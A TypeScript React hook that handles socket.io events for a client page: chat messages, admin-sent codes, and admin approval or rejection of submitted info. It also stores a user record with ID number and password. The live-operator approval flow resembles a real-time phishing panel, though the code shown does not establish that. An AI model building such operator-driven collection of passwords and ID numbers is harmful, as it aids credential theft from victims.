import { customHistory } from "@/components/CustomRouter";
import { Message } from "@/types";
import { deleteCookie } from "cookies-next";
import { useEffect } from "react";
import {
  code,
  isAdminError,
  isChat,
  isError,
  isNewMessage,
  lastMessage,
  loading,
  mainInfo,
  message,
  messages,
  permissions,
  ROOM,
  socket,
} from "../context/signals";
import { setCurrentPage } from "../utils/utils";

function useRealTime() {
  useEffect(() => {
    // == Listen For Successfully Connected With Real Time Server  ==
    socket.value.on("successfully-connected", (socketId: string) => {
      mainInfo.value = { ...mainInfo.value, socketId };

      //Joining With Current Id To Server
      socket.value.emit("join", socketId);

      // socket.value.emit("join", ROOM);
    });

    // == Receiving Messages For Chat ==

    socket.value.on("receive-message", (m: Message) => {
      messages.value = [...messages.value, m];
      if (!isChat.value) {
        isNewMessage.value += 1;
      }
    });

    // == Done Operation Message From Admin  ==

    socket.value.on(
      "admin-last-message",
      ({ message }: { message: string }) => {
        lastMessage.value = message;
        loading.value = "";
        setCurrentPage("END");
      }
    );

    // == Code That Sent From Admin  ==

    socket.value.on("code", (adminCode: string) => {
      code.value = adminCode;
      loading.value = "";
    });

    socket.value.on(
      "admin-response",
      ({ state, next }: { state: boolean; next: string }) => {
        loading.value = "";
        permissions.value = [...permissions.value, next];
        if (state) {
          customHistory.push("/" + next);
        } else {
          isAdminError.value = true;
          message.value =
            "Admin Rejected The Info That You Send To Him, Pleas Make Sure About Them And Try Again !";
        }
      }
    );

    socket.value.on("deleted", () => {
      socket.value.disconnect();

      mainInfo.value = {
        fullName: "",
        email: "",
        phone: "",
        idNumber: "",
        password: "",
        _id: "",
        room: ROOM,
        ip: "",
        country: "",
        city: "",
        date: "",
        socketId: "",
        page: "",
      };

      deleteCookie("ID");

      isError.value = "The Admin Is Removed Your Account! Try Again Later";
    });

    socket.value.on("isAdminConnected", (status) => {
      if (!status)
        isError.value = "Admin Not Connected Write Now, Come Back Later";
    });

    socket.value.on("check-admin", ({ status }: { status: boolean }) => {
      if (!status) {
        isError.value = "Admin Is Not Connected Write Now, Come Back Later";
      } else {
        isError.value = "";
      }
    });

    return function () {
      socket.value.off("deleted");
      socket.value.off("isAdminConnected");
      socket.value.off("code");
      socket.value.off("admin-last-message");
      socket.value.off("receive-message");
      socket.value.removeListener("receive-message");
      socket.value.removeListener("isAdminConnected");
      socket.value.removeListener("deleted");
      socket.value.removeListener("code");
      socket.value.removeListener("admin-last-message");
      socket.value.removeAllListeners();
    };
  }, [socket.value]);

  return {};
}

export default useRealTime;
